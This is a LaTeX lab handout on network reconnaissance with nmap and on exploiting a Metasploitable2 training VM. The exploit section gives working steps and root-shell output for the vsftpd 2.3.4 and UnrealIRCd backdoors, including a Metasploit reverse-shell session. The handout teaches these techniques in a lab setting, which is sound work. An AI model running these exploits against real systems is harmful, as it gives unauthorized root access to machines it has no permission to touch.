\documentclass[11pt,a4paper]{article}

% --- Packages ---
\usepackage[margin=.75in]{geometry}
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{lmodern} % Fix for font not found error
\usepackage{titlesec}
\usepackage{enumitem}
\usepackage{hyperref}
\usepackage{xcolor}
\usepackage{fancyhdr}
\usepackage{comment}
\usepackage{cleveref}
\usepackage[bottom]{footmisc}
\usepackage{graphicx}
\usepackage{longtable}
\usepackage{booktabs}
\usepackage{array}
\usepackage{calc}
\usepackage{etoolbox}

% Standard Pandoc setup
\providecommand{\tightlist}{%
  \setlength{\itemsep}{0pt}\setlength{\parskip}{0pt}}

\crefformat{section}{\S#2#1#3}
\crefformat{subsection}{\S#2#1#3}
\crefformat{subsubsection}{\S#2#1#3}
\crefformat{figure}{#2Figure~#1#3}
\crefformat{footnote}{#2\footnotemark[#1]#3}

\linespread{0.9} % Riduce lo spazio tra le linee

% --- Colors ---
\definecolor{primary}{RGB}{0, 0, 0}
\definecolor{links}{HTML}{0000EE}
\definecolor{blue}{HTML}{26428B}

\hypersetup{
    colorlinks=true,
    linkcolor=links,
    urlcolor=links,
    citecolor=links,
}

% --- Section Formatting ---
\titleformat{\section}
  {\normalfont\Large\bfseries\color{blue}}{\thesection}{1em}{}
\titleformat{\subsection}
{\normalfont\large\bfseries\color{blue}}{\thesubsection}{1em}{}
\titleformat{\subsubsection}
{\normalfont\bfseries\color{blue}}{\thesubsubsection}{1em}{}

% --- Header and Footer ---
\pagestyle{fancy}
\fancyhead[L]{\small Giuseppe Capasso}
\fancyhead[R]{\small metasploit}
\fancyfoot[C]{\thepage}
\renewcommand{\headrulewidth}{0.4pt}

% --- Custom Title Command ---
\newcommand{\proposaltitle}[1]{
    \begin{center}
        \vspace*{0.1cm}
        {\LARGE \bfseries \color{blue} #1} \\[1.5ex]
        {\large \textbf{Giuseppe Capasso}} \\[1ex]
                \small{
            \vspace{0.1cm}
            \textbf{Materia:} metasploit\\
        }
            \end{center}
    \vspace{0.3cm}
    \hrule height 0.5pt
    \vspace{0.5cm}
}

\begin{document}

\proposaltitle{Recognition and Exploit lab}

\section{Recognition and Exploit lab}\label{recognition-and-exploit-lab}

In this lab, you will learn how to perform a network scanning and how to
use tools to exploit known vulnerabilities.

\subsection{Requirements}\label{requirements}

\begin{itemize}
\tightlist
\item
  Kali Linux
\item
  Virtual box (or any hypervisor)
\end{itemize}

\subsection{Nmap}\label{nmap}

Nmap (aka network map) is a tool used to discover host and services in a
host.

\subsubsection{Explore Nmap}\label{explore-nmap}

You can use Kali Linux in a virtual machine for the purpose of this lab.
Scan the following site: scanme.nmap.org

Note: This site has been developed by Nmap for the purpose of scanning.
Never scan any site, system, or network without prior permission from
the owner.

\paragraph{Task 1}\label{task-1}

Nmap comes pre-installed in Kali Linux. Just open a terminal, type
``nmap scanme.nmap.org'' without the inverted commas. This will initiate
a scan of the target and will attempt to determine which ports are open
and what services are open on these ports.

\includegraphics[width=5.83333in,height=2.35541in]{media/rId21.png} As
we can see from the scan results, there are 4 ports open, and there are
different services running on each port. The scan we just performed,
however, is a very basic scan and will only scan the top 1000 ports for
basic information. In the next step, we will run a more advanced scan.

\paragraph{Task 2}\label{task-2}

In this step, we will be scanning the same target, scanme.nmap.org, but
with a more advanced scan. Let's say we want to determine the versions
for the services running on each port, so that we can determine if they
are out of date and potentially vulnerable to exploitation. We also want
to determine the operating system of the webserver running the target
site. We will run the following scan to determine this information:

Oops! You must be root before doing this type of scan. Type ``sudo'' and
re-enter nmap command with desired parameters. The line in the terminal
will be like the following:

\begin{verbatim}
sudo nmap -v -sT -sV -O scanme.nmap.org
\end{verbatim}

The results from our scan show us the exact versions of software running
on each open port. Note, if there was a firewall protecting this
webserver, we may be unable to see this information. We can also
determine with relatively high accuracy the version of the operating
system running on the web server.

\includegraphics[width=5.83333in,height=3.94845in]{media/rId25.png} An
easier way to perform a full scan on a target is to use the -A flag,
which will scan a target using the -sS, -sV, and -O flags.

\subsection{Exploiting a real machine}\label{exploiting-a-real-machine}

You will lean about metasploit: an exploit database ready to run.

\subsubsection{Setting up a target
machine}\label{setting-up-a-target-machine}

In this lab, we will use \textbf{metasploitable2}: a vulnerable Linux
Machine with some services on it. Download it
\href{https://sourceforge.net/projects/metasploitable/files/latest/download}{here}
and extract it in a folder.

Now you will need to import it in virtual box.

Open virtualbox and create a new virtual machine, choose no iso and set
type to \texttt{Ubuntu\ (64-bit)}. Now, give some resources and go to
disk creation and choose \texttt{Use\ an\ existing\ disk}. Add the
\texttt{.vmdk} file and start the VM.

More details about metasploitable2 can be found
\href{https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/}{here}

\subsubsection{Exploit the machine}\label{exploit-the-machine}

\paragraph{Scan the machine}\label{scan-the-machine}

First of all, scan the target machine to find out what services and
ports are available. You can use nmap command:

\begin{verbatim}
sudo nmap -v -sT -sV -O <ip-target>
\end{verbatim}

\paragraph{Exploit FTP}\label{exploit-ftp}

On port 21, Metasploitable2 runs vsftpd, a popular FTP server. This
particular version contains a backdoor that was slipped into the source
code by an unknown intruder. The backdoor was quickly identified and
removed, but not before quite a few people downloaded it. If a username
is sent that ends in the sequence :) {[} a happy face {]}, the
backdoored version will open a listening shell on port 6200. We can
demonstrate this with telnet or use the Metasploit Framework module to
automatically exploit it:

\begin{verbatim}
root@ubuntu:~# telnet 192.168.99.131 21
Trying 192.168.99.131...
Connected to 192.168.99.131.
Escape character is '^]'.
220 (vsFTPd 2.3.4)
user backdoored:)
331 Please specify the password.
pass invalid
^]
telnet> quit
Connection closed.
                       
root@ubuntu:~# telnet 192.168.99.131 6200
Trying 192.168.99.131...
Connected to 192.168.99.131.
Escape character is '^]'.
id;
uid=0(root) gid=0(root)
\end{verbatim}

\paragraph{Exploit IRC}\label{exploit-irc}

On port 6667, Metasploitable2 runs the UnreaIRCD IRC daemon. This
version contains a backdoor that went unnoticed for months - triggered
by sending the letters ``AB'' following by a system command to the
server on any listening port. Metasploit has a module to exploit this in
order to gain an interactive shell, as shown below.

\begin{verbatim}
msfconsole
 
msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf  exploit(unreal_ircd_3281_backdoor) > set RHOST 192.168.99.131
msf  exploit(unreal_ircd_3281_backdoor) > exploit
 
[*] Started reverse double handler
[*] Connected to 192.168.99.131:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
[*] Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 8bMUYsfmGvOLHBxe;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "8bMUYsfmGvOLHBxe\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.99.128:4444 -> 192.168.99.131:60257) at 2012-05-31 21:53:59 -0700


id
uid=0(root) gid=0(root)
\end{verbatim}

\end{document}
